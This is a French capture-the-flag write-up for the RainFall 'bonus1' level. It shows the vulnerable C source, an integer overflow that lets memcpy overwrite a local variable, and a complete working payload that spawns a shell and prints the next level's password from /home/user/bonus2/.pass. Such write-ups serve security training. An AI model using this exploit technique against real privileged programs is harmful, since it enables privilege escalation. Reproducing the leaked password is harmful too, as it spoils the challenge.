# Bonus 1

Voici le code source:

```C
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int ac, char **av)
{
    char buff[40];
    int nb;

    nb = atoi(av[1]);
    if (nb < 10)
    {
        memcpy(buff, av[2], nb * 4);
        if (nb == 0x574f4c46)
        {
            execl("/bin/sh", "sh", 0);
        }
        return 0;
    }
    return 1;
}
```

Ici notre but est de reecrire la valeur de `nb` grace a `memcpy()`. Pour ceci il nous faut faire un `integer overflow` pour avoir une valeur negative mais qui multipliee par 4 nous donnera un resultat superieur ou egal a 44 (40 + 4 octets pour ecraser `nb`).
Pour cela nous pouvons utiliser notre programme C:

```bash
➜  Resources git:(main) ✗ gcc nb_generator.c
➜  Resources git:(main) ✗ ./a.out
-2147483648 - 0
-2147483647 - 4
-2147483646 - 8
-2147483645 - 12
-2147483644 - 16
-2147483643 - 20
-2147483642 - 24
-2147483641 - 28
-2147483640 - 32
-2147483639 - 36
-2147483638 - 40
-2147483637 - 44
-2147483636 - 48
-2147483635 - 52
-2147483634 - 56
-2147483633 - 60
```

Nous pouvons donc prendre toutes les valeurs superieures ou egales a `-2147483637`. 

Ensuite nous devons juste overflow `buff` pour ecraser `nb` avec cette valeur: `0x574f4c46`. Ce qui nous donne ce payload:

```bash
bonus1@RainFall:~$ ./bonus1 -2147483633 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
